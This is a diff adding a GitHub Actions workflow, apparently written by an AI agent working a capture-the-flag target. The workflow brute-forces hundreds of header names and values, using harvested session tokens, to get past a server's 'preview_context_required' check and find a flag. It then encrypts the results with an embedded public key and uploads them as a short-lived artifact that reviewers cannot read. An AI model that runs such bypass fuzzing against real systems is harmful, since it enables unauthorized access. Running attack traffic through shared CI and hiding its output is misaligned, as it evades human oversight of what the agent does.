@@ -1,0 +1,78 @@
+name: launchlet-part2-header-probe
+
+on:
+  push:
+    branches: [agent/launchlet-part2-header-20260808]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Bulk probe transport marker headers and encrypt differential hits
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests, pathlib, urllib.parse, json, itertools
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
+          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']
+          url=urllib.parse.urljoin(base,act['endpoint']); body={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}
+          baseh={'Accept':'application/json','Content-Type':'application/json','apikey':boot['client']['anonKey'],'Authorization':'Bearer '+boot['client']['session']}
+          prefixes=['X-Launchlet','Launchlet','X-Preview','Preview','X-LL','LL','X-Deploy','Deploy']
+          suffixes=['Preview','Context','Preview-Context','Client','Client-Context','Client-Mode','Preview-Mode','Session','Preview-Session','Runtime','Runtime-Context','Source','Preview-Source','Request-Context','Request','Preview-Request','Studio','Studio-Context','Environment','Preview-Environment','Stage','Role','Preview-Role','Mode','Capability','Preview-Capability','Scope','Preview-Scope','Origin','Preview-Origin','Build','Project','Workspace','Server-Reference','Server-Context','Action','Action-Context','Deploy','Deploy-Context','Token','Preview-Token','Context-Token','Context-Id','Internal','Internal-Preview','Internal-Context','Live-Preview','Preview-Client','Preview-Runtime','Auth','Preview-Auth','Key','Preview-Key']
+          names=[]
+          for p,sf in itertools.product(prefixes,suffixes): names.append(p+'-'+sf)
+          names += ['X-Requested-With','Requested-With','Purpose','Sec-Purpose','X-Client-Context','Client-Context','X-Runtime-Context','Runtime-Context','X-Preview-Context','Preview-Context','X-Launchlet-Preview-Context']
+          names=list(dict.fromkeys(names))
+          batches=[names[i:i+70] for i in range(0,len(names),70)]
+          values=[
+            'preview','1','true','enabled','active','yes','on','open','allow','allowed','guest','public','studio','browser','live','sandbox','internal','trusted','preview-board','preview-studio','live-preview','preview_guest','preview_guest_session',
+            boot['client']['session'],boot['client']['anonKey'],boot['project'],boot['workspace'],mf['build'],mf['previewReceipt'],act['id'],refs['runtime'],refs['generatedAt'],'preview:guest','preview:public','preview:receipt:read','Launchlet','rc3','2026'
+          ]
+          values=list(dict.fromkeys(values)); baseline=(403,'{"error":"preview_context_required"}'); hits=[]; tries=0
+          for bi,batch in enumerate(batches):
+            for val in values:
+              tries+=1; h={**baseh,**{n:val for n in batch}}
+              try:r=s.post(url,headers=h,json=body,timeout=10,allow_redirects=False)
+              except Exception as e: continue
+              if (r.status_code,r.text.strip())!=baseline:
+                hits.append({'batch':bi,'names':batch,'value':val,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+                if r.status_code==200 or 'caplag{' in r.text: break
+            if hits and any(x['status']==200 or 'caplag{' in x['body'] for x in hits): break
+          (out/'summary.json').write_text(json.dumps({'name_count':len(names),'batch_count':len(batches),'tries':tries,'hits':hits},indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .
+          openssl rand 32 > package/aes.key
+          openssl rand 16 > package/iv.bin
+          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
+          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact
+          base64 -w0 package/result.enc > artifact/result.enc.b64
+          base64 -w0 package/key.enc > artifact/key.enc.b64
+          base64 -w0 package/iv.bin > artifact/iv.bin.b64
+          rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part2-header-encrypted
+          path: artifact/
+          retention-days: 1
